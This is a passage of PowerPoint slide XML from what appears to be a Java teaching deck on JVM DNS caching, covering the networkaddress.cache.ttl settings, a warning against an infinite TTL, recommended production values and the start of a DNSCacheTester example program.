                <a:tab pos="1371600" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>&gt;0 = override with custom TTL (seconds)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:effectLst/>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381000" y="381000"/>
            <a:ext cx="11582400" cy="5021055"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marR="0" lvl="0">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:tabLst>
                <a:tab pos="4572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3.  Security Warning           // Dangerous setting - makes Java ignore DNS updates</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R="0">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>System.setProperty</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>networkaddress.cache.ttl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>", "-1");</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1371600" lvl="2" indent="-457200">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:tabLst>
                <a:tab pos="9144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Never use -1 in production:</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1371600" marR="0" lvl="2" indent="-457200">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:tabLst>
                <a:tab pos="13716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Breaks DNS failover scenarios</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1371600" marR="0" lvl="2" indent="-457200">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:tabLst>
                <a:tab pos="13716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Security vulnerability (won't detect IP changes)</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1371600" marR="0" lvl="2" indent="-457200">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:tabLst>
                <a:tab pos="13716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Violates RFC guidelines for DNS caching</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R="0" lvl="0">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>
            </a:pP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R="0" lvl="0">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:tabLst>
                <a:tab pos="4572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4. Best Practice Configuration          // Recommended production settings</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457200" marR="0">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>System.setProperty</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>networkaddress.cache.ttl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>", "30"); // 30s cache</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457200" marR="0">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>System.setProperty</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>networkaddress.cache.negative.ttl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>", "0"); // No negative cache</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457200" marR="0">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </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R="0" lvl="0">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:tabLst>
                <a:tab pos="4572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5. Implementation Notes</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914400" marR="0" lvl="1" indent="-457200">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:tabLst>
                <a:tab pos="9144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These settings affect all </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> lookups JVM-wide</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914400" marR="0" lvl="1" indent="-457200">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:tabLst>
                <a:tab pos="9144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Must be set before first DNS resolution</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914400" marR="0" lvl="1" indent="-457200">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:tabLst>
                <a:tab pos="9144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Doesn't affect OS-level or DNS server caching</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a:p>
            <a:pPr marL="914400" marR="0" lvl="1" indent="-457200">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:tabLst>
                <a:tab pos="914400" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Java 9+ added module system restrictions (may require security policy updates)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">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247650" y="76200"/>
            <a:ext cx="11811000" cy="37191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r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The following code demonstrates the effect of using and not using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cache:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings 2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="228600" y="448111"/>
            <a:ext cx="11811000" cy="634019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400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>import java.net.*;</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import </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>java.security.Security</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pP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public class </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>DNSCacheTester</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> {</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public static void main(String[] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) throws Exception {</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 Validate input arguments</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if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>args.length</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> &lt; 2) {</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System.err.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("Usage: java </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>DNSCacheTester</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> &lt;hostname&gt; &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>cacheTTL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;");</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System.err.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("Example: java </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>DNSCacheTester</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> google.com 30");</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return;</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String hostname = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>[0];     String </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>cacheTTL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>[1];</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pP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 Configure DNS cache settings</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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Security.setProperty</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>networkaddress.cache.ttl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>", </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>cacheTTL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
              <a:highlight>
                <a:srgbClr val="FFFF00"/>
              </a:highlight>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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Security.setProperty</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>networkaddress.cache.negative.ttl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>", "0");  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>// Disable negative cache</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System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("DNS cache TTL set to " + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>cacheTTL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> + " seconds");</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pP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 First DNS lookup (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>uncached</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>)</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long </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>startTime</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.currentTimeMillis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>();</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InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
